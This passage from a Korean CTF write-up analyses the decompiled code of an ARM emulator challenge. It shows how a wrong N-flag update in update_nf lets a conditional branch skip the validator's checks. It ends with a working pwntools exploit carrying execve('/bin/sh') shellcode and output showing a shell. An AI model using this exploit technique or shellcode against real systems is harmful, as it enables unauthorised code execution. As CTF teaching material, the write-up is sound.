&#123;r0-r12&#125;, 0</span></span><br><span class="line">  v0 = <span class="built_in">memcpy</span>(em-&gt;code + <span class="number">52</span>, dest, <span class="number">4044u</span>);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">void</span> *))em-&gt;code)(v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>setup</code> 함수는 <code>emulator</code> 구조체 변수 <code>em</code> 과 <code>reg</code> 구조체, 각종 메모리를 할당합니다. <code>emulator</code> 구조체는 <code>mmap</code> 시스템 콜로 할당한 코드, 힙, 스택 역할을 하는 메모리의 주소와 <code>reg</code> 구조체 포인터를 멤버로 가집니다. <code>reg</code> 구조체는 범용 레지스터들과 <code>CPSR</code> 레지스터 역할을 하는 정수형 변수 17개를 멤버로 가집니다. 할당 이후 <code>em-&gt;reg-&gt;pc</code> , <code>em-&gt;reg-&gt;sp</code> 를 각각 <code>em-&gt;code</code> , <code>em-&gt;stack</code> 으로 초기화합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">setup</span><span class="params">()</span> <span class="comment">// 0x1088c</span></span><br><span class="line">&#123;</span><br><span class="line">  emulator *v1; <span class="comment">// r4</span></span><br><span class="line">  emulator *v2; <span class="comment">// r4</span></span><br><span class="line">  emulator *v3; <span class="comment">// r4</span></span><br><span class="line">  emulator *v4; <span class="comment">// r4</span></span><br><span class="line"></span><br><span class="line">  setvbuf((FILE *)<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf((FILE *)<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  em = (emulator *)<span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">16u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v1 = em;</span><br><span class="line">  v1-&gt;code = (<span class="type">char</span> *)mmap((<span class="type">void</span> *)<span class="number">0x1000</span>, <span class="number">4096u</span>, <span class="number">7</span>, <span class="number">0x4022</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;code )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v2 = em;</span><br><span class="line">  v2-&gt;heap = (<span class="type">char</span> *)mmap((<span class="type">void</span> *)<span class="number">0x2000</span>, <span class="number">4096u</span>, <span class="number">3</span>, <span class="number">0x4022</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;heap )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v3 = em;</span><br><span class="line">  v3-&gt;<span class="built_in">stack</span> = (<span class="type">char</span> *)mmap((<span class="type">void</span> *)<span class="number">0x3000</span>, <span class="number">4096u</span>, <span class="number">3</span>, <span class="number">0x4022</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;<span class="built_in">stack</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v4 = em;</span><br><span class="line">  v4-&gt;reg = (<span class="keyword">struct</span> reg *)<span class="built_in">calloc</span>(<span class="number">1u</span>, <span class="number">68u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !em-&gt;reg )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  em-&gt;reg-&gt;pc = (<span class="type">unsigned</span> <span class="type">int</span>)em-&gt;code;</span><br><span class="line">  em-&gt;reg-&gt;sp = (<span class="type">unsigned</span> <span class="type">int</span>)em-&gt;<span class="built_in">stack</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">emulator</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">reg</span> *<span class="title">reg</span>;</span></span><br><span class="line">  <span class="type">char</span> *<span class="built_in">stack</span>;</span><br><span class="line">  <span class="type">char</span> *code;</span><br><span class="line">  <span class="type">char</span> *heap;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> sp, lr, pc, cpsr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>edit_code</code> 함수는 <code>em-&gt;code</code> 주소에 실행할 코드를 입력받는데, 길이가 4의 배수가 아니면 -1을 반환합니다. 이 경우 <code>main</code> 함수에서 <code>exit(-1)</code> 을 호출하여 종료합니다. 입력받은 후 <code>exit</code> 시스템 콜을 호출하는 코드를 뒤에 덧붙입니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit_code</span><span class="params">()</span> <span class="comment">// 0x10af0</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> len; <span class="comment">// [sp+4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  len = read(<span class="number">0</span>, em-&gt;code, <span class="number">4031u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (len &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;em-&gt;code[len], &amp;exit_code, <span class="number">12u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>check_code</code> 함수는 반복문을 돌면서 <code>em-&gt;reg-&gt;pc</code> 로부터 4바이트씩 인스트럭션 <code>inst</code> 를 읽습니다. <code>check_cpsr</code> 함수를 <code>inst</code> 를 인자로 호출하여 리턴값이 0이 아니면, switch-case 구문으로 인스트럭션의 클래스에 해당하는 <code>check_*</code> 함수를 호출합니다. <code>check_cpsr</code> 함수가 0을 리턴하거나 <code>check_*</code> 함수가 -1을 리턴하는 경우 <code>sigill</code> 함수를 호출하는데, 이 함수는 오류 메시지를 출력하고 <code>exit(-1)</code> 로 프로그램을 종료합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_code</span><span class="params">()</span> <span class="comment">// 0x10bb0</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> op1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> inst; <span class="comment">// [sp+0h] [bp-Ch]</span></span><br><span class="line">  <span class="type">int</span> fetched; <span class="comment">// [sp+4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( inst = <span class="number">-1</span>; em-&gt;reg-&gt;pc &lt; (<span class="type">unsigned</span> <span class="type">int</span>)(em-&gt;code + <span class="number">4096</span>); inst = fetched )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">char</span> *)em-&gt;reg-&gt;pc &lt; em-&gt;code )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    fetched = *(_DWORD *)em-&gt;reg-&gt;pc;</span><br><span class="line">    em-&gt;reg-&gt;pc += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !inst )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( inst != <span class="number">-1</span> &amp;&amp; !check_cpsr(inst) )</span><br><span class="line">      sigill(inst);</span><br><span class="line">    op1 = get_class(inst);</span><br><span class="line">    <span class="keyword">if</span> ( op1 &lt;= <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( op1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0u</span>:                                <span class="comment">// data processing and miscellaneous instructions</span></span><br><span class="line">          <span class="keyword">if</span> ( check_data_processing(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">          <span class="keyword">if</span> ( check_multiply(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2u</span>:                                <span class="comment">// branch, branch with link, block data transfer</span></span><br><span class="line">          <span class="keyword">if</span> ( check_branch(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          fetched = <span class="number">-1</span>;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3u</span>:                                <span class="comment">// supervisor call</span></span><br><span class="line">          <span class="keyword">if</span> ( check_syscall() == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4u</span>:                                <span class="comment">// load/store word and unsigned byte</span></span><br><span class="line">          <span class="keyword">if</span> ( check_load_store(inst) == <span class="number">-1</span> )</span><br><span class="line">            sigill(inst);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( op1 != <span class="number">-1</span> )</span><br><span class="line">LABEL_23:</span><br><span class="line">      sigill(inst);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>각각의 <code>check_*</code> 함수는 인스트럭션의 형식이나 인자를 검사한 후, 통과하면 인스트럭션의 실행 결과를 <code>emulator</code> 구조체 변수 <code>em</code> 에 반영하고 통과하지 못한 경우 -1을 리턴하여 종료하도록 합니다. 예를 들어 <code>check_branch</code> 함수는 인자가 상수(immediate) 값인 분기 인스트럭션을 검사하고 <code>em-&gt;reg-&gt;pc</code> 를 갱신하는데, 조건문을 통해 목적지 주소가 <code>em-&gt;code</code> 로 할당된 메모리를 벗어나는 경우 -1을 반환합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_branch</span><span class="params">(<span class="type">int</span> inst)</span>   <span class="comment">// 0x11f28</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r3</span></span><br><span class="line"></span><br><span class="line">  v1 = shl8(inst);</span><br><span class="line">  v2 = <span class="number">4</span> * (v1 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ((v1 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x20000000</span>) != <span class="number">0</span> )</span><br><span class="line">    v2 += <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( em-&gt;reg-&gt;pc + <span class="number">4</span> * (v2 &gt;&gt; <span class="number">2</span>) &gt;= (<span class="type">unsigned</span> <span class="type">int</span>)(em-&gt;code + <span class="number">0x4000</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  em-&gt;reg-&gt;pc += <span class="number">4</span> * (<span class="number">4</span> * (v1 &gt;&gt; <span class="number">8</span>) / <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4" tabindex="-1">문제 풀이</h2>
<p>분석한 결과를 바탕으로 생각할 수 있는 익스플로잇 시나리오가 두 가지 정도 있습니다.</p>
<ol>
<li><code>check_code</code> 함수의 <code>check_*</code> 루틴에서 익스플로잇 프리미티브(e.g. 임의 쓰기)를 찾아 익스플로잇한다.</li>
<li><code>check_code</code> 의 검사를 통과하면서, <code>main</code> 에서 입력한 코드를 호출했을 때 익스플로잇이 수행되는 셸코드를 입력한다.</li>
</ol>
<p>그런데 <code>check_*</code> 함수들은 대부분 목적지 레지스터나 주소의 범위에 제한을 두고 있어 익스플로잇 프리미티브 구성에 도움이 되지 않습니다. 예를 들어 다음은 <code>check_load_store</code> 함수의 일부입니다. 23행, 26행, 32행 등을 보면 목적지 레지스터는 <code>R0</code> , … , <code>R12</code> 까지만 가능하도록, 읽고 쓰는 주소는 <code>em-&gt;heap</code> , <code>em-&gt;stack</code> 으로 할당된 메모리만 가능하도록 제한을 두고 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_load_store</span><span class="params">(<span class="type">int</span> inst)</span>	<span class="comment">// 0x12000</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  bit11_0 = get_bit11_0(inst);</span><br><span class="line">  rn = get_bit16_19(inst);</span><br><span class="line">  <span class="keyword">if</span> ( rn &lt;= <span class="number">12</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    rn_val = (<span class="type">char</span> *)*(&amp;em-&gt;reg-&gt;r0 + rn);</span><br><span class="line">    <span class="keyword">if</span> ( get_bit25(inst) )                      <span class="comment">// bit25 is 1 (A bit)</span></span><br><span class="line">    &#123;</span><br><span class="line">      rm = bit11_0 &amp; <span class="number">0xF</span>;</span><br><span class="line">      <span class="keyword">if</span> ( rm &gt; <span class="number">12</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> ( get_bit24(inst) )                      <span class="comment">// bit24 is 1 (P bit)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( get_bit23(inst) )                    <span class="comment">// bit23 is 1 (U bit)</span></span><br><span class="line">        v6 = &amp;rn_val[bit11_0];</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v6 = &amp;rn_val[-bit11_0];</span><br><span class="line">      <span class="keyword">if</span> ( get_bit20(inst) )                    <span class="comment">// bit20 is 1</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v6 &lt; em-&gt;heap || v6 &gt; em-&gt;heap + <span class="number">4096</span>) &amp;&amp; (v6 &lt; em-&gt;<span class="built_in">stack</span> || v6 &gt; em-&gt;<span class="built_in">stack</span> + <span class="number">4096</span>) )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        rt = shr12(inst);</span><br><span class="line">        <span class="keyword">if</span> ( rt &gt; <span class="number">0xC</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        *(&amp;em-&gt;reg-&gt;r0 + rt) = *(_DWORD *)v6;   <span class="comment">// load</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (v6 &lt; em-&gt;heap || v6 &gt; em-&gt;heap + <span class="number">4096</span>) &amp;&amp; (v6 &lt; em-&gt;<span class="built_in">stack</span> || v6 &gt; em-&gt;<span class="built_in">stack</span> + <span class="number">4096</span>) )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        v13 = shr12(inst);</span><br><span class="line">        <span class="keyword">if</span> ( v13 &gt; <span class="number">0xC</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        *(_DWORD *)v6 = *(&amp;em-&gt;reg-&gt;r0 + v13);  <span class="comment">// store</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>산술 연산과 관련된 인스트럭션을 검사하는 <code>check_data_processing</code> 함수에서도 9행, 11행 등에서 산술 연산의 목적지와 인자 레지스터에 제한을 두고 있습니다. 그런데 실제 연산의 결과를 반영하는 서브루틴에서 흥미로운 코드를 찾을 수 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_data_processing</span><span class="params">(<span class="type">int</span> inst)</span>	<span class="comment">// 0x117b8</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  v7 = sub_114E0(inst);</span><br><span class="line">  bit11_0 = get_bit11_0(inst);</span><br><span class="line">  bit16_19 = get_bit16_19(inst);</span><br><span class="line">  v10 = shr12(inst);</span><br><span class="line">  bit20 = get_bit20(inst);</span><br><span class="line">  <span class="keyword">if</span> ( bit16_19 &lt; <span class="number">0</span> || bit16_19 &gt; <span class="number">12</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v10 &lt; <span class="number">0</span> || v10 &gt; <span class="number">12</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">switch</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">      <span class="keyword">if</span> ( check_add(bit16_19, v4, v10, bit20) == <span class="number">-1</span> )</span><br><span class="line">        sigill(inst);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p><code>check_add</code> 함수는 <code>check_data_processing</code> 함수에서 <code>ADD</code> 인스트럭션의 결과를 반영하기 위해 호출하는 서브루틴입니다. 이 함수는 연산 결과를 목적지 레지스터에 대입하고, <code>update_zf_nf</code> 함수를 호출하여 <code>CPSR</code> 레지스터의 플래그를 갱신하고 있습니다. (<code>update_zf_nf</code> 함수를 호출하는 조건 <code>a4</code> 는 인스트럭션의 bit 20이 전달된 값으로, <code>S</code> 비트에 해당합니다)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_add</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span>	<span class="comment">// 0x12fb8</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// [sp+14h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  update_cf(*(&amp;em-&gt;reg-&gt;r0 + a1) + a2 &lt; *(&amp;em-&gt;reg-&gt;r0 + a1));</span><br><span class="line">  result = a2 + *(&amp;em-&gt;reg-&gt;r0 + a1);</span><br><span class="line">  <span class="keyword">if</span> ( a4 )</span><br><span class="line">    update_zf_nf(result);</span><br><span class="line">  *(&amp;em-&gt;reg-&gt;r0 + a3) = result;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>update_zf_nf</code> 함수는 인자로 받은 연산 결과를 <code>update_zf</code> , <code>update_nf</code> 함수에 전달합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">update_zf_nf</span><span class="params">(<span class="type">int</span> a1)</span>	<span class="comment">// 0x12d4c</span></span><br><span class="line">&#123;</span><br><span class="line">  update_zf(a1);</span><br><span class="line">  update_nf(a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>update_nf</code> 함수는 연산의 결과가 0이 아닐 경우 비트 연산을 통해 <code>em-&gt;reg-&gt;cpsr</code> 값의 bit 31에 1을 대입합니다. 이는 <code>CPSR</code> 레지스터의 <code>N</code> 비트에 해당하는데, 정의 상 <code>N</code> 비트는 결과가 음수인 경우(최상위 비트가 1인 경우) 1이어야 합니다. 따라서 <code>update_nf</code> 함수는 <code>em-&gt;reg-&gt;cpsr</code> 값을 실제 인스트럭션의 결과와 다르게 반영하고 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">update_nf</span><span class="params">(<span class="type">int</span> a1)</span>    <span class="comment">// 0x12ccc</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">    em-&gt;reg-&gt;cpsr |= <span class="number">0x80000000</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    em-&gt;reg-&gt;cpsr &amp;= <span class="number">0x70000000</span>u;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>이를 이용해 다음과 같이 셀코드를 입력하고도 <code>check_code</code> 함수를 통과하여 실행하는 익스플로잇 시나리오를 구성할 수 있습니다. (단순 셸코드를 입력하면 <code>check_syscall</code> 함수에서 시스템 콜 번호를 필터링하여 종료합니다)</p>
<ol>
<li>산술 연산을 통해 <code>em-&gt;reg-&gt;cpsr</code> 의 <code>N</code> 비트가 1이 되도록 합니다. (잘못 반영된 결과입니다)</li>
<li><code>N</code> 비트와 관련된 조건 분기를 통해 셸코드 부분을 실행하지 않고 점프하도록 합니다.</li>
<li>실제 실행 시에는 <code>N</code> 비트가 0으로 조건 분기를 수행하지 않아, 셸코드를 실행하게 됩니다.</li>
</ol>
<p><code>check_cpsr</code> 함수를 보면 모든 조건이 구현되어 있지는 않지만, <code>LT</code> (signed less than) 조건은 구현되어 있습니다. 따라서 셸코드 이전에 결과가 0이 아닌 산술 연산을 수행하고 <code>BLT</code> 인스트럭션으로 조건 분기하도록 하겠습니다. <code>check_code</code> 함수 상에서는 <code>update_nf</code> 함수에서 잘못 반영한 결과로 인해 <code>N</code> 비트가 1이 되어, <code>V</code> 비트와 같지 않게 되므로 조건 분기를 수행합니다. 그러나 실제 실행 시에는 <code>N</code> 비트가 0으로 조건 분기를 수행하지 않을 것입니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">check_cpsr</span><span class="params">(<span class="type">int</span> inst)</span> <span class="comment">// 0x11314</span></span><br><span class="line">&#123;</span><br><span class="line">  _BOOL4 v1; <span class="comment">// r3</span></span><br><span class="line">  _BOOL4 v2; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> valid; <span class="comment">// [sp+8h] [bp-24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> cpsr; <span class="comment">// [sp+10h] [bp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  cpsr = em-&gt;reg-&gt;cpsr;</span><br><span class="line">  <span class="keyword">switch</span> ( shr28(inst) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0u</span>:                                    <span class="comment">// equal (z == 1)</span></span><br><span class="line">      valid = cpsr &amp; <span class="number">0x40000000</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:                                    <span class="comment">// not equal (z == 0)</span></span><br><span class="line">      valid = (cpsr &amp; <span class="number">0x40000000</span>) == <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10u</span>:                                   <span class="comment">// signed greater than or equal (n == v)</span></span><br><span class="line">      valid = cpsr &gt;&gt; <span class="number">31</span> == (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">11u</span>:                                   <span class="comment">// signed less than (n != v)</span></span><br><span class="line">      valid = cpsr &gt;&gt; <span class="number">31</span> != (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">12u</span>:                                   <span class="comment">// signed greater than (z == 0 and n == v)</span></span><br><span class="line">      v1 = (cpsr &amp; <span class="number">0x40000000</span>) == <span class="number">0</span> &amp;&amp; cpsr &gt;&gt; <span class="number">31</span> == (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      valid = v1;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">13u</span>:                                   <span class="comment">// signed less than or equal (z == 1 or n == v)</span></span><br><span class="line">      v2 = (cpsr &amp; <span class="number">0x40000000</span>) != <span class="number">0</span> || cpsr &gt;&gt; <span class="number">31</span> != (<span class="number">8</span> * cpsr) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">      valid = v2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">14u</span>:                                   <span class="comment">// always</span></span><br><span class="line">      valid = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:                                    <span class="comment">// can only be executed unconditionally</span></span><br><span class="line">      valid = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> valid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>다음과 같이 <code>ADDS</code> 인스트럭션의 결과가 1이 되도록 하고, <code>BLT</code> 의 분기 주소를 셸코드 이후가 되도록 익스플로잇 코드를 작성하였습니다. 익스플로잇 코드를 실행하면 셸을 획득할 수 있습니다.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process([&quot;qemu-arm-static&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabi&quot;, &quot;./app&quot;])</span></span><br><span class="line">r = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">1234</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    payload = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    adds r0, r0, 1</span></span><br><span class="line"><span class="string">    blt exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode:</span></span><br><span class="line"><span class="string">    add r0, pc, 12</span></span><br><span class="line"><span class="string">    mov r1, 0</span></span><br><span class="line"><span class="string">    mov r2, 0</span></span><br><span class="line"><span class="string">    mov r7, 11</span></span><br><span class="line"><span class="string">    svc 0</span></span><br><span class="line"><span class="string">    .word 0x6e69622f</span></span><br><span class="line"><span class="string">    .word 0x0068732f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">exit:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>, arch=<span class="string">&quot;arm&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">b&quot;Insert Your Code :&gt;&quot;</span>, payload)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;:&gt;&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Secret code :&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Code? :&gt;&quot;</span>, r.recvline().strip())</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./ex.py</span><br><span class="line">[+] Opening connection to localhost on port 1234: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> Good! Now Execute Real Machine</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1000(ctf) gid=1000(ctf) <span class="built_in">groups</span>=1000(ctf)</span><br></pre></td></tr></table></figure>
<h3 id="%EB%8B%A4%EB%A5%B8-%ED%92%80%EC%9D%B4" tabindex="-1">다른 풀이</h3>
<p><code>check_code</code> 함수를 보면 다음의 10행에서 <code>inst</code> 가 0인 경우 반복문을 탈출합니다. 이 경우 0을 리턴하여 <code>main</code> 함수의 검사를 통과하기 때문에 곧바로 입력한 코드를 실행할 수 있습니다. ARM에서 기계어 <code>\x00\x00\x00\x00</code> 은 <code>ANDEQ R0, R0, R0</code> 인스트럭션에 해당하는데, 실제로는 아무 영향이 없는 <code>NOP</code> 와 같습니다.</p>
